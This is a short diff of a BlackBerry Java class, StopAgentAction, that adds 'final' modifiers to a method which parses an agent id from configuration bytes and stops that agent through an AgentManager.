@@ -10,7 +10,6 @@ package blackberry.action;
 import java.io.EOFException;
 
 import net.rim.device.api.util.DataBuffer;
-
 import blackberry.AgentManager;
 import blackberry.event.Event;
 
@@ -18,23 +17,23 @@ public class StopAgentAction extends SubAction {
 
     int agentId;
 
-    public StopAgentAction(int actionId_, byte[] confParams) {
+    public StopAgentAction(final int actionId_, final byte[] confParams) {
         super(actionId_);
         parse(confParams);
     }
 
-    public boolean execute(Event triggeringEvent) {
+    public boolean execute(final Event triggeringEvent) {
         // #debug
         debug.info("Stopping " + agentId);
-        AgentManager agentManager = AgentManager.getInstance();
+        final AgentManager agentManager = AgentManager.getInstance();
 
-        boolean ret = agentManager.stop(agentId);
+        final boolean ret = agentManager.stop(agentId);
         // disable?
         return ret;
     }
 
-    protected boolean parse(byte[] confParams) {
-        DataBuffer databuffer = new DataBuffer(confParams, 0,
+    protected boolean parse(final byte[] confParams) {
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
 
         try {
@@ -42,7 +41,7 @@ public class StopAgentAction extends SubAction {
             // #debug
             debug.trace("agentId: " + agentId);
 
-        } catch (EOFException e) {
+        } catch (final EOFException e) {
             // #debug
             debug.error("params FAILED");
             return false;
